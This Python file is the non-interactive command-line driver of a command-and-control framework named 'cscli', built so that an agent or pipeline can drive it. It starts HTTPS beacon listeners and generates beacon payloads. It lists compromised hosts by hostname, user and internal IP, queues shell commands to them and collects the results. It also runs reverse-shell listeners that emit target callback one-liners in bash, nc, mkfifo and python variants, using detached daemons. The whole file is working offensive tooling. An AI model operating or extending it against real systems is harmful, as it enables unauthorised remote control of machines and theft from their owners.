"""Non-interactive CLI driver for cscli -- the AI/script-friendly entrypoint.

Unlike the interactive Console, this exposes single-shot subcommands that an
agent or build pipeline can call directly and get structured output:

    # start a listener and keep the server alive (blocking)
    python3 cscli --server --https --name main --port 443 --host 0.0.0.0 \\
                   --key mypass [--background]

    # generate a client payload for a running/planned listener
    python3 cscli --payload --url https://HOST:443 --out beacon.py \\
                   [--key mypass] [--no-verify] [--interval 3] [--jitter 0.2]

    # list sessions
    python3 cscli --list

    # task a session and (optionally) wait for its result
    python3 cscli --task <sid> "shell id" [--wait]

    # dump results for a session
    python3 cscli --results <sid>
"""
import argparse
import json
import os
import sys
import threading
import time


def _load_server(data_dir=None):
    from ..server import TeamServer
    if data_dir is None:
        data_dir = os.environ.get("CSCLI_DATA_DIR")
    return TeamServer(data_dir=data_dir)


def _out(obj):
    try:
        sys.stdout.write(json.dumps(obj, ensure_ascii=False, indent=2) + "\n")
    except TypeError:
        sys.stdout.write(str(obj) + "\n")


# --------------------------------------------------------------------------
# subcommand handlers
# --------------------------------------------------------------------------
def _cmd_server(srv, args):
    # In --background mode the listener is owned by a detached daemon process;
    # first do a quick bind-check so we can report errors from the parent.
    if args.background:
        # pre-flight: verify the port is free, then delegate to daemon
        probe = _probe_bind(args.host, args.port)
        if probe:
            _out({"ok": False, "error": f"port {args.port} already in use: {probe}"})
            return 1
        pid = _spawn_background_daemon(args.name, args.host, args.port,
                                       args.https, args.key)
        _wait_port(args.host, args.port, timeout=8)
        url = ("https" if args.https else "http") + f"://{args.host}:{args.port}"
        _out({"ok": True, "daemon_pid": pid, "listener": url, "name": args.name})
        return 0

    # Foreground (or daemon child): actually start + hold the listener.
    if args.https:
        lis, err = srv.start_https_listener(
            args.name, args.host, args.port,
            crypto_key=args.key if args.key and args.key.lower() != "none" else None)
    else:
        lis, err = srv.start_listener(
            args.name, args.host, args.port,
            crypto_key=args.key if args.key and args.key.lower() != "none" else None)
    if err:
        _out({"ok": False, "error": err})
        return 1
    _out({"ok": True, "listener": lis.name, "url": lis.url,
          "scheme": lis.scheme, "port": lis.port,
          "aes": lis.gcm is not None, "daemon": True if os.environ.get("CSCCLI_DAEMON") else False})
    try:
        _keep_alive(srv)  # blocking: keeps this process (and the listener) alive
    except KeyboardInterrupt:
        pass
    return 0


def _probe_bind(host, port):
    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((host, port))
        return None
    except OSError as e:
        return str(e)
    finally:
        s.close()


def _wait_port(host, port, timeout=8):
    """Wait until a TCP connect to host:port succeeds (listener is up)."""
    import socket
    deadline = time.time() + timeout
    while time.time() < deadline:
        s = socket.socket()
        s.settimeout(0.5)
        try:
            r = s.connect_ex((host, port))
            s.close()
            if r == 0:
                return True
        except OSError:
            s.close()
        time.sleep(0.3)
    return False


def _spawn_background_daemon(name, host, port, https, key):
    """Fork a fully detached child that owns the listener (blocking loop)."""
    import subprocess as _sp
    here = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    log = os.path.join(here, "data", "daemon.log")
    os.makedirs(os.path.dirname(log), exist_ok=True)
    argv = [sys.executable, os.path.join(here, "cscli"), "--server",
            "--name", name, "--host", host, "--port", str(port)]
    if https:
        argv.append("--https")
    if key:
        argv += ["--key", key]
    with open(log, "w") as lf:
        proc = _sp.Popen(argv, stdout=lf, stderr=_sp.STDOUT,
                         start_new_session=True,
                         env={**os.environ, "CSCCLI_DAEMON": "1"})
    return proc.pid


def _keep_alive(srv):
    while True:
        time.sleep(60)


def _cmd_payload(srv, args):
    from ..payload import write_payload
    write_payload(args.url, args.out, interval=args.interval,
                  jitter=args.jitter,
                  key=args.key if args.key else None,
                  no_verify=args.no_verify)
    _out({"ok": True, "path": os.path.abspath(args.out),
          "url": args.url, "aes": bool(args.key)})


def _cmd_list(srv, args):
    srv.store.reload()
    sess = srv.store.all()
    rows = [{"id": s["id"], "hostname": s["hostname"],
             "user": s["username"], "ip": s["internal_ip"],
             "listener": s["listener"],
             "alive": srv.is_session_alive(s)} for s in sess]
    _out({"sessions": rows, "count": len(rows)})


def _cmd_task(srv, args):
    tid, info = srv.task(args.session_id, args.cmdline)
    if info and "error" in info:
        _out({"ok": False, "error": info["error"]})
        return 1
    if args.wait:
        # emit only the (possibly-delayed) result envelope
        return _wait_result(srv, args.session_id, tid, args.timeout)
    _out({"ok": True, "queued": tid, "session": args.session_id,
          "cmd": args.cmdline})
    return 0


def _wait_result(srv, sid, tid, timeout):
    deadline = time.time() + timeout
    while time.time() < deadline:
        srv.store.reload()
        s = srv.store.get(sid)
        for r in (s or {}).get("results", []):
            if r.get("id") == tid:
                _out({"ok": True, "session": sid, "task": tid,
                      "result": r["data"]})
                return 0
        time.sleep(1)
    _out({"ok": False, "session": sid, "task": tid, "error": "timeout waiting for result"})
    return 1


def _cmd_results(srv, args):
    srv.store.reload()
    s = srv.store.get(args.session_id)
    if not s:
        _out({"ok": False, "error": "session not found"})
        return 1
    rows = [{"id": r["id"], "ts": r["ts"], "data": r["data"]} for r in s["results"]]
    _out({"session": args.session_id, "results": rows, "count": len(rows)})


def _cmd_disconnect(srv, args):
    """Queue a disconnect task; the beacon stops and removes itself."""
    srv.store.reload()
    ok, msg = srv.disconnect_session(args.session_id)
    if isinstance(ok, tuple):  # task() returns (tid, info)
        tid, info = ok
        if info and "error" in info:
            _out({"ok": False, "error": info["error"]})
            return 1
        _out({"ok": True, "session": args.session_id, "queued_disconnect": tid})
        return 0
    _out({"ok": ok, "session": args.session_id, "message": msg})
    return 0 if ok else 1


def _cmd_delete(srv, args):
    """Remove a session record from the store (optionally force-removing a live
    session). Use --disconnect first to stop a live beacon cleanly."""
    srv.store.reload()
    ok, msg = srv.remove_session(args.session_id, force=args.force)
    _out({"ok": ok, "session": args.session_id, "force": args.force,
          "message": msg})
    return 0 if ok else 1


# --------------------------------------------------------------------------
# reverse-shell (raw TCP interactive shell) subcommands
# --------------------------------------------------------------------------
def _cmd_reverse_shell(srv, args):
    from ..server.reverseshell import reverse_shell_command, VARIANTS
    if not args.callback:
        _out({"ok": False, "error": "--callback <HOST> required to build the " +
              "one-liner the target runs"})
        return 1
    if args.background:
        if _probe_bind(args.host, args.port):
            _out({"ok": False, "error": f"port {args.port} in use"})
            return 1
        _spawn_reverse_shell_daemon(args.name, args.host, args.port)
        # A probe TCP connect would create a phantom reverse-shell session, so
        # wait for the child to bind with a fixed sleep instead.
        time.sleep(1.0)
        cmd = reverse_shell_command(args.callback, args.port, args.variant or "bash")
        _out({"ok": True, "listener": f"reverse-shell://{args.host}:{args.port}",
              "name": args.name,
              "callback_command": cmd,
              "note": "run the callback on the target; sessions appear via --rsh-list or this daemon's log"})
        return 0
    # foreground: start and keep alive (holds the listener + does session
    # reconciliation + command-queue processing for the multi-process model)
    lis, err = srv.start_reverse_shell(args.name, args.host, args.port)
    if err:
        _out({"ok": False, "error": err})
        return 1
    cmd = reverse_shell_command(args.callback, args.port, args.variant or "bash")
    _out({"ok": True, "listener": lis.url, "callback_command": cmd})
    try:
        # reconcile sessions to disk + process queued commands (daemon side)
        _rsh_watch(srv)
        _keep_alive(srv)
    except KeyboardInterrupt:
        pass
    return 0


def _rsh_state_path():
    return os.path.join(os.environ.get("CSCLI_DATA_DIR") or
                        os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(
                            os.path.abspath(__file__)))), "data"),
                        "rsh_sessions.json")


def _rsh_cmds_dir():
    return os.path.join(os.environ.get("CSCLI_DATA_DIR") or
                        os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(
                            os.path.abspath(__file__)))), "data"),
                        "rsh_cmds")


def _rsh_watch(srv):
    """Daemon-side reconcile loop: persist sessions to disk, service any
    command requests left by --rsh-shell invocations."""
    import json as _json
    seen = set()

    def reconcile():
        state = {}
        for name, lis in srv.rsh_listeners.items():
            for s in lis.list_sessions():
                state[s.id] = {"listener": name, "session": s.id,
                               "peer": f"{s.addr[0]}:{s.addr[1]}", "open": s.open}
        os.makedirs(os.path.dirname(_rsh_state_path()), exist_ok=True)
        with open(_rsh_state_path(), "w") as f:
            _json.dump({"sessions": list(state.values()), "count": len(state)}, f)

    # background thread: reconcile + process command queue
    def loop():
        while True:
            time.sleep(0.5)
            try:
                reconcile()
                _process_rsh_commands(srv)
            except Exception:
                pass
    threading.Thread(target=loop, daemon=True).start()


def _process_rsh_commands(srv):
    """Scan rsh_cmds/<sid>/ for *.req and execute them on the live shell."""
    import glob as _glob
    base = _rsh_cmds_dir()
    for req in _glob.glob(os.path.join(base, "*", "*.req")):
        sid = os.path.basename(os.path.dirname(req))
        resp = req.replace(".req", ".resp")
        try:
            with open(req) as f:
                cmd = f.read()
            sess = None
            for lis in srv.rsh_listeners.values():
                sess = lis.get(sid)
                if sess:
                    break
            if not sess:
                with open(resp, "w") as f: f.write("(session gone)")
            else:
                sess.send_line(cmd)
                # drain available output for up to ~2.5s to capture the result
                out = ""
                dl = time.time() + 2.5
                while time.time() < dl:
                    b = sess.read_available()
                    if b:
                        out += b.decode(errors="replace")
                        dl = time.time() + 0.8  # reset window on new data
                    else:
                        time.sleep(0.15)
                with open(resp, "w") as f: f.write(out)
        except Exception:
            pass
        try:
            os.unlink(req)
        except Exception:
            pass


def _spawn_reverse_shell_daemon(name, host, port):
    import subprocess as _sp
    here = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    log = os.path.join(here, "data", "rsh-daemon.log")
    os.makedirs(os.path.dirname(log), exist_ok=True)
    argv = [sys.executable, os.path.join(here, "cscli"), "--reverse-shell",
            "--name", name, "--host", host, "--port", str(port),
            "--callback", host]
    with open(log, "w") as lf:
        proc = _sp.Popen(argv, stdout=lf, stderr=_sp.STDOUT,
                         start_new_session=True,
                         env={**os.environ, "CSCCLI_RSH_DAEMON": "1"})
    return proc.pid


def _cmd_rsh_list(srv, args):
    try:
        with open(_rsh_state_path()) as f:
            d = json.load(f)
        _out({"sessions": d.get("sessions", []), "count": len(d.get("sessions", []))})
    except Exception:
        _out({"sessions": [], "count": 0})


def _cmd_rsh_shell(srv, args):
    """Drive one reverse-shell session via the daemon's command queue.
    Write a .req, poll for .resp, print output. (Daemon holds the live socket.)"""
    import glob as _glob
    import uuid
    os.makedirs(_rsh_cmds_dir(), exist_ok=True)
    sdir = os.path.join(_rsh_cmds_dir(), args.session_id)
    os.makedirs(sdir, exist_ok=True)
    req = os.path.join(sdir, f"{int(time.time()*1000)}-{uuid.uuid4().hex[:6]}.req")
    resp = req.replace(".req", ".resp")
    cmd = args.command or ""
    with open(req, "w") as f:
        f.write(cmd)
    # poll for response
    deadline = time.time() + 20
    out = "(timeout)"
    while time.time() < deadline:
        if os.path.exists(resp):
            try:
                with open(resp) as f:
                    out = f.read()
                os.unlink(resp)
            except Exception:
                out = "(read error)"
            break
        time.sleep(0.4)
    _out({"ok": True, "session": args.session_id, "command": cmd, "output": out})
    return 0


def run(argv):
    srv = _load_server()
    p = build_parser()
    args = p.parse_args(argv)
    handlers = {
        "server": _cmd_server,
        "payload": _cmd_payload,
        "list": _cmd_list,
        "task": _cmd_task,
        "results": _cmd_results,
        "disconnect": _cmd_disconnect,
        "delete": _cmd_delete,
        "reverse-shell": _cmd_reverse_shell,
        "rsh-list": _cmd_rsh_list,
        "rsh-shell": _cmd_rsh_shell,
    }
    if not args.cmd:
        p.print_help()
        return 1
    return handlers[args.cmd](srv, args)


def build_parser():
    p = argparse.ArgumentParser(prog="cscli", description="cscli C2 (non-interactive)")
    sub = p.add_subparsers(dest="cmd")

    ps = sub.add_parser("server", help="start a listener / team server (blocking)")
    ps.add_argument("--name", default="main")
    ps.add_argument("--host", default="0.0.0.0")
    ps.add_argument("--port", type=int, default=443)
    ps.add_argument("--https", action="store_true", help="use TLS listener")
    ps.add_argument("--key", default=None, help="AES channel passphrase")
    ps.add_argument("--background", action="store_true", help="don't block")
    ps.add_argument("--persist", action="store_true", help="keep running")

    pp = sub.add_parser("payload", help="generate a beacon payload file")
    pp.add_argument("--url", required=True, help="listener URL")
    pp.add_argument("--out", required=True, help="output .py path")
    pp.add_argument("--key", default=None)
    pp.add_argument("--no-verify", action="store_true")
    pp.add_argument("--interval", type=int, default=3)
    pp.add_argument("--jitter", type=float, default=0.2)

    pl = sub.add_parser("list", help="list beacon sessions")

    pt = sub.add_parser("task", help="task a session")
    pt.add_argument("session_id")
    pt.add_argument("cmdline")
    pt.add_argument("--wait", action="store_true", help="wait for result")
    pt.add_argument("--timeout", type=int, default=30)

    pr = sub.add_parser("results", help="show session results")
    pr.add_argument("session_id")

    pdc = sub.add_parser("disconnect", help="order a beacon to disconnect and self-remove")
    pdc.add_argument("session_id")

    pdl = sub.add_parser("delete", help="remove a session record (--force to drop an alive one)")
    pdl.add_argument("session_id")
    pdl.add_argument("--force", action="store_true")

    prs = sub.add_parser("reverse-shell", help="start a raw TCP reverse-shell listener")
    prs.add_argument("--name", default="rsh")
    prs.add_argument("--host", default="0.0.0.0")
    prs.add_argument("--port", type=int, default=4444)
    prs.add_argument("--callback", default=None,
                     help="public host/IP the target should dial for the callback command")
    prs.add_argument("--variant", default="bash",
                     choices=["bash", "nc", "nc-e", "mkfifo", "python"])
    prs.add_argument("--background", action="store_true")

    plist = sub.add_parser("rsh-list", help="list active reverse-shell sessions")

    pshell = sub.add_parser("rsh-shell", help="interact with a reverse-shell session")
    pshell.add_argument("session_id")
    pshell.add_argument("--command", default=None,
                        help="send one command and print output (non-interactive)")

    return p


if __name__ == "__main__":
    sys.exit(run(sys.argv[1:]))
